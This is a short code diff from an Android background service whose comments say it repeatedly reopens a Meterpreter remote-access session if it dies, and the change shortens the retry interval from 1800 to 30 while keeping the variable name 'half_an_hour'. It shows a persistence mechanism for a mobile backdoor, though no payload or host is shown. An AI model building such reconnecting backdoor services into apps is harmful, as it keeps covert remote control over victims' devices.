@@ -30,7 +30,7 @@ public class MyIntentService extends Service {
         //if meterpreter session dies unexpectedly, the background service will try to reopen it without restarting the app
         //since a new session is started, even if the current session is still alive, i put a very large period (30 min)
 
-        long half_an_hour = (3600)/(2); //time passing between each attempt to open a new meterpreter session
+        long half_an_hour = (60)/(2); //time passing between each attempt to open a new meterpreter session
 
         final Runnable beeper = new Runnable() {
 
